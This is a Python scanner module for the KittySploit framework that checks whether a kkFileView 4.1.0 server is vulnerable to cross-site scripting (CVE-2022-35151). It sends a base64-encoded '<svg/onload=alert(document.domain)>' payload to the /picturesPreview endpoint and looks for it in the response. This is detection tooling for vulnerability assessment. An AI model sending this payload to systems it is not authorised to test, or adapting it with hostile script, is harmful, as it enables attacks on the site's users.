#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""kkFileView 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'kkFileView 4.1.0 - Cross-Site Scripting Detection',
        'description': 'kkFileView 4.1.0 contains multiple cross-site scripting vulnerabilities via the urls and currentUrl parameters at /controller/OnlinePreviewController.java.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'kkfileview', 'keking', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/kekingcn/kkFileView/issues/366',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-35151',
            'https://github.com/StarCrossPortal/scalpel',
            'https://github.com/anonymous364872/Rapier_Tool',
            'https://github.com/youcans896768/APIV_Tool',
        ],
        'cve': 'CVE-2022-35151',
    }

    def run(self):
        path = '/picturesPreview?urls=aHR0cDovLzEyNy4wLjAuMS8xLnR4dCI%2BPHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4%3D'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<svg/onload=alert(document.domain)>', '图片预览',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='kkFileView 4.1.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

